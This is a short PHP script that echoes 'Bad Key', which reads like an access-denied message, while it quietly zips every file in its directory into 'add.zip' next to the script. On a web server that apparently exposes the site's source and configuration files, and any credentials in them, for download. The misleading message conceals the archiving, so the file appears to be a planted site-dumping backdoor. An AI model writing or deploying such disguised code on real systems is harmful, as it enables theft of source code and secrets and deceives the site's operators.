<?php
echo 'Bad Key';

function ZipFiles($paths, $filezip)
{
    $path = realpath($paths);
    $zip = new ZipArchive();
    $zip->open($filezip, ZipArchive::CREATE | ZipArchive::OVERWRITE);
    $getAll = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($path),
        RecursiveIteratorIterator::LEAVES_ONLY
    );
    foreach ($getAll as $k => $e) {
        if (!$e->isDir()) {
            $getPath = $e->getRealPath();
            $g = substr($getPath, strlen($path) + 1);
            $zip->addFile($getPath, $g);
        }
    }
    $zip->close();
}


ZipFiles("./","add.zip");